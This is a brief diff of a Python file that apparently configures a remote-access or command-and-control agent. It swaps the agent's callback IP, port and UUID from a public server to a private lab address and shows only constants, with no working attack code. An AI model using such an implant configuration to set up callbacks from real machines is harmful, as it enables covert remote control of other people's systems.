@@ -13,9 +13,9 @@ winreg_exists = importlib.find_loader('winreg')
 if winreg_exists:
     import winreg
 
-UUID = "ea4iFScQxHoSYMnztWhFyhVNOe5oZgeT"
-remote_ip = '134.209.206.142'
-remote_port = 8081
+UUID = "67cf26b8-9942-11ea-a2db-bc14ef68ef25"   #python -c 'import uuid; print(uuid.uuid1())'
+remote_ip = '192.168.119.149'
+remote_port = 80
 server_sni_hostname = ''
 VERBOSE = False
 DEVNULL = subprocess.DEVNULL
